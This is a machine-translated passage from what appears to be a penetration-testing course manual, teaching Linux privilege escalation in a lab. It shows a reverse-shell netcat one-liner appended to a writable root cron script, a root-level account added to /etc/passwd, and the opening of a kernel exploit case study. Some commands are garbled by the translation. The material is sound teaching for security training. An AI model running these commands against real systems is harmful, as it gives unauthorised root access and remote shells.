<div style="position:absolute;top:148028;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Jan27 17:50:01 受害者</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CRON</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> [2631]:( </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">root</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) CMD (cd /var/scripts/ &amp;&amp; </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./user_backups.sh</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font></font></nobr></div>
<div style="position:absolute;top:148045;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Jan27 17:55:01 受害者</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CRON</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> [2656]:( </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">root</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) CMD (cd /var/scripts/ &amp;&amp; </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./user_backups.sh</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font></font></nobr></div>
<div style="position:absolute;top:148062;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Jan27 18:00:01 受害者</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CRON</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> [2671]:( </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">root</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) CMD (cd /var/scripts/ &amp;&amp; </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./user_backups.sh</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font></font></nobr></div>
<div style="position:absolute;top:148081;left:347"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 582 - 检查 cron 日志文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:148111;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">似乎在 /var/scripts/ 下的名为 user_backups.sh 的脚本是在</font></font></nobr></div>
<div style="position:absolute;top:148130;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根用户。</font><font style="vertical-align: inherit;">从时间戳来看，这个作业似乎每五分钟运行一次。</font></font></nobr></div>
<div style="position:absolute;top:148163;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于我们知道脚本的位置，我们可以检查它的内容和权限。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:148198;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat /var/scripts/user_backups.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:148215;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/bin/bash</font></font></nobr></div>
<div style="position:absolute;top:148249;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cp -rf /home/student/ /var/backups/student/</font></font></nobr></div>
<div style="position:absolute;top:148283;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls -lah /var/scripts/user_backups.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:148300;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rwxrwx </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">rw</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> - 1 root root 52 ian 27 17:02 /var/scripts/user_backups.sh</font></font></nobr></div>
<div style="position:absolute;top:148319;left:227"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 583 - 显示 user_backups.sh 脚本的内容和权限</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:148348;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脚本本身相当简单：它只是将学生用户的主目录复制到</font></font></nobr></div>
<div style="position:absolute;top:148368;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">备份子目录。</font><font style="vertical-align: inherit;">脚本</font><font style="vertical-align: inherit;">的权限</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">544</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表明每个本地用户都可以写入</font></font></nobr></div>
<div style="position:absolute;top:148387;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:148507;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">542 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Ubuntu，2013），https://help.ubuntu.com/community/FilePermissions</font></font></font></nobr></div>
<div style="position:absolute;top:148527;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">543 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Cron</font></font></font></nobr></div>
<div style="position:absolute;top:148547;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">544 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Arch Linux，2019），https://wiki.archlinux.org/index.php/File_permissions_and_attributes</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:148675;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="126"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 126 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:148708;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:149785;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:149785;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:149785;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">567</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:148804;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于非特权用户可以修改备份脚本的内容，我们可以编辑它并添加一个</font></font></nobr></div>
<div style="position:absolute;top:148823;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">反壳单衬。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">545</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们的计划有效，我们应该在我们的系统上收到一个根级反向 shell</font></font></nobr></div>
<div style="position:absolute;top:148842;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最多五分钟后攻击机器。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:148877;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:/var/scripts$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo &gt;&gt; user_backup.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:148911;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:/var/scripts$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:148928;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc 10.11.0.4 1234 &gt;/tmp/f”&gt;&gt; user_backups.sh</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:148962;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:/var/scripts$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat user_backups.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:148979;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/bin/bash</font></font></nobr></div>
<div style="position:absolute;top:149013;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cp -rf /home/student/ /var/backups/student/</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:149064;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.11.0.4 1234 &gt;/tmp/f</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:149083;left:271"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 584 - 在 user_backups.sh 中插入反向 shell 单行</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:149113;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们现在要做的就是在我们的 Kali Linux 机器上设置一个监听器并等待 cron 作业</font></font></nobr></div>
<div style="position:absolute;top:149132;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:149167;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc -lnvp 1234</font></font></font></b></nobr></div>
<div style="position:absolute;top:149184;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听[任何] 1234 ...</font></font></nobr></div>
<div style="position:absolute;top:149201;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从（未知）[10.11.0.128] 43172 连接到 [10.11.0.4]</font></font></nobr></div>
<div style="position:absolute;top:149218;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/bin/sh: 0: 无法访问 tty; </font><font style="vertical-align: inherit;">作业控制关闭</font></font></nobr></div>
<div style="position:absolute;top:149235;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">呼啦啦</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:149252;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:149269;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># </font></font></nobr></div>
<div style="position:absolute;top:149288;left:323"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 585 - 从我们的目标获取 root shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:149318;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如前面的清单所示，cron 作业确实执行了，反向 shell 单行程序也是如此。</font><font style="vertical-align: inherit;">我们有</font></font></nobr></div>
<div style="position:absolute;top:149337;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成功提升了我们的权限并可以访问目标上的 root shell。</font></font></nobr></div>
<div style="position:absolute;top:149370;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然这是一个简单的例子，但我们在现场也遇到过几次类似的情况</font></font></nobr></div>
<div style="position:absolute;top:149389;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因为管理员通常更专注于解决 cron 的奇怪语法而不是保护</font></font></nobr></div>
<div style="position:absolute;top:149408;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脚本文件权限。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:149443;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.3.2.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:149473;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 以非特权用户身份登录您的 Debian 客户端并尝试将您的特权提升到</font></font></nobr></div>
<div style="position:absolute;top:149492;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用上述技术root。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:149527;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.3.3</font></font></i></nobr></div>
<div style="position:absolute;top:149527;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不安全的文件权限：/etc/passwd 案例研究</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:149564;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">除非使用诸如 Active Directory 或 LDAP 之类的集中式凭证系统，否则 Linux 密码</font></font></nobr></div>
<div style="position:absolute;top:149584;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一般存放在/etc/shadow中，普通用户是无法读取的。</font><font style="vertical-align: inherit;">然而从历史上看，</font></font></nobr></div>
<div style="position:absolute;top:149603;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码哈希值以及其他帐户信息都存储在世界可读的文件中</font></font></nobr></div>
<div style="position:absolute;top:149622;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/etc/passwd. </font><font style="vertical-align: inherit;">为了向后兼容，如果密码哈希出现在第二列</font></font></nobr></div>
<div style="position:absolute;top:149642;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/etc/passwd 用户记录，它被认为对身份验证有效，并且优先于</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:149735;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">545 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Pentest Money，2019 年），http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:149863;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="127"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 127 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:149896;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:150973;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:150973;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:150973;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">568</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:149992;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/etc/shadow 中的相应条目（如果可用）。</font><font style="vertical-align: inherit;">这意味着如果我们可以写入</font></font></nobr></div>
<div style="position:absolute;top:150011;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/etc/passwd 文件，我们可以有效地为任何帐户设置任意密码。</font></font></nobr></div>
<div style="position:absolute;top:150044;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们来演示一下。</font><font style="vertical-align: inherit;">在上一节中，我们展示了我们的 Debian 客户端可能存在漏洞</font></font></nobr></div>
<div style="position:absolute;top:150063;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于 /etc/passwd 权限设置不正确而导致权限提升。</font><font style="vertical-align: inherit;">在</font></font></nobr></div>
<div style="position:absolute;top:150083;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了提升我们的权限，我们将添加另一个超级用户 (root2) 和</font></font></nobr></div>
<div style="position:absolute;top:150102;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/etc/passwd 文件对应的密码哈希。</font><font style="vertical-align: inherit;">我们将首先生成密码哈希</font></font></nobr></div>
<div style="position:absolute;top:150121;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">openssl</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">passwd</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数</font><font style="vertical-align: inherit;">的帮助下</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">默认情况下，如果没有指定其他选项，</font></font></nobr></div>
<div style="position:absolute;top:150140;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">openssl 将使用 crypt 算法生成散列，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">546</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一种受支持的散列机制</font></font></nobr></div>
<div style="position:absolute;top:150160;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于 Linux 身份验证。</font><font style="vertical-align: inherit;">生成哈希后，我们将使用以下命令在 /etc/passwd 中添加一行</font></font></nobr></div>
<div style="position:absolute;top:150179;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适当的格式：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:150214;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">openssl passwd evil</font></font></font></b></nobr></div>
<div style="position:absolute;top:150231;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AK24fcSx2Il3I</font></font></nobr></div>
<div style="position:absolute;top:150265;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" &gt;&gt; /etc/passwd</font></font></font></b></nobr></div>
<div style="position:absolute;top:150299;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">su root2</font></font></font></b></nobr></div>
<div style="position:absolute;top:150316;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码：</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">邪恶</font></font></font></b></nobr></div>
<div style="position:absolute;top:150350;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">root@debian:/home/student# </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">id</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:150367;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">uid=0(root) gid=0(root) 组=0(root)</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:150386;left:296"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 586 - 通过编辑 /etc/passwd 提升权限</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:150416;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如清单 586 所示，我们 /etc/passwd 记录中的“root2”用户和密码哈希是</font></font></nobr></div>
<div style="position:absolute;top:150435;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">后跟用户 ID (UID) 零和组 ID (GID) 零。</font><font style="vertical-align: inherit;">这些零值指定</font></font></nobr></div>
<div style="position:absolute;top:150454;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们创建的帐户是 Linux 上的超级用户帐户。</font><font style="vertical-align: inherit;">最后，为了验证我们的修改</font></font></nobr></div>
<div style="position:absolute;top:150474;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是有效的，我们使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">su</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令将我们的标准用户切换到新创建的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">root2</font></font></i></nobr></div>
<div style="position:absolute;top:150493;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户并发出</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">id</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令以显示我们确实具有</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">root</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:150528;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.3.3.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:150558;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用您的学生凭证登录您的 Debian 客户端，并尝试提升您的</font></font></nobr></div>
<div style="position:absolute;top:150577;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过将超级用户帐户添加到 /etc/passwd 文件来获得特权。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:150611;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.3.4</font></font></i></nobr></div>
<div style="position:absolute;top:150611;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内核漏洞：CVE-2017-1000112 案例研究</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:150649;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内核漏洞利用是提升权限的绝佳方式，但成功可能取决于匹配</font></font></nobr></div>
<div style="position:absolute;top:150669;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不仅是目标的内核版本，还有操作系统的风格，包括 Debian、Redhat、</font></font></nobr></div>
<div style="position:absolute;top:150688;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Gentoo 等。</font></font></nobr></div>
<div style="position:absolute;top:150721;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与我们的 Windows 示例类似，模块的这一部分将无法在您的</font></font></nobr></div>
<div style="position:absolute;top:150740;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">专用客户端，但您将能够在实验室内的各种主机上使用此技术</font></font></nobr></div>
<div style="position:absolute;top:150760;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">环境。</font></font></nobr></div>
<div style="position:absolute;top:150792;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了演示这个攻击向量，我们将首先通过检查来收集有关我们目标的信息</font></font></nobr></div>
<div style="position:absolute;top:150812;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/etc/issue 文件。</font><font style="vertical-align: inherit;">正如模块前面所讨论的，这是一个系统文本文件，其中包含一个</font></font></nobr></div>
<div style="position:absolute;top:150831;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Linux 机器上的登录提示之前打印的消息或系统标识。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:150923;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">546 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（维基百科，2019 年），https:</font></font><font style="vertical-align: inherit;"> //en.wikipedia.org/wiki/Crypt_ </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(C)</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:151051;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="128"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 128 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:151084;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:152161;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:152161;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:152161;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">569</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:151182;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">n00b@victim:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat /etc/issue</font></font></font></b></nobr></div>
<div style="position:absolute;top:151199;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ubuntu 16.04.3 LTS \n \l</font></font></nobr></div>
<div style="position:absolute;top:151218;left:275"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 587 - 收集有关目标系统的一般信息</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:151248;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们将使用标准系统命令检查内核版本和系统架构：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:151282;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">n00b@victim:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">uname -r</font></font></font></b></nobr></div>
<div style="position:absolute;top:151299;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.8.0-58-通用</font></font></nobr></div>
<div style="position:absolute;top:151316;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">n00b@victim:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">arch</font></font></font></b></nobr></div>
<div style="position:absolute;top:151333;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86_64</font></font></nobr></div>
